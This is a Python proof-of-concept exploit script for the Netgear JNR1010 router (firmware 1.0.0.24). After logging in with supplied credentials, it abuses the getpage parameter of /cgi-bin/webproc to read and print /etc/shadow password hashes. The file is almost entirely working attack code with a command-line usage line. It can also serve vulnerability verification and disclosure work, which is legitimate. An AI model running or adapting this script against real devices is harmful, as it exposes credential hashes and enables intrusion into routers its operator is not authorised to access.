#device: Netgear jnr1010 Firmware: 1.0.0.24
import requests
import sys
import base64
from colorama import Fore

decription= r"""
 -----------------------------------------------------------------------------
|                                                                            |
|                                                                            |
|                                                                            |
|                                 Hyo-In                                     |
|                                                                            |
|                                                                            |
|                                                                            |
 -----------------------------------------------------------------------------
"""

def exploit(target, ID, password):

	base = ID + ':' + password

	#Authorization encode to Base64
	encookie = base64.encodestring(base)

	#to use burpsuite
	#proxies = {'http':'http://localhost:8080', 'https':'http://localhost:8080'}

	s = requests.Session()

	#get sessionid
	URL = 'http://'+target+'/cgi-bin/webproc'
	headers = {'Authorization' : 'Basic ' + encookie.rstrip('\n')}
	res = s.get(URL, headers=headers)

	#set sessionid & login
	dic = s.cookies.get_dict()
	cookies = {'Cookie' : 'sessionid=' + dic.get('sessionid')}
	res = s.get(URL, headers=headers, cookies=cookies)

	#Remote File Disclosure
	URL = 'http://' + target + '/cgi-bin/webproc?getpage=/etc/shadow&var:language=en_us&var:language=en_us&var:menu=advanced&var:page=basic_home'
	res = s.get(URL, headers=headers, cookies=cookies)

	check = res.text[6:11]

	if check == '$1$BO':
		print ('This device has this vulnerability\n')
		print(res.text.rstrip('\n'))
	else:
		print('This device does not have this vulnerability')
	

if __name__ == "__main__":
	print decription
	if len(sys.argv) is not 4:
		print(decription)
		print(Fore.RED+"[-] Example: python Netgear_Path_Traversal.py <Target IP> <ID> <Password>"+Fore.RESET)
		sys.exit()
	else:
		exploit(sys.argv[1], sys.argv[2], sys.argv[3])


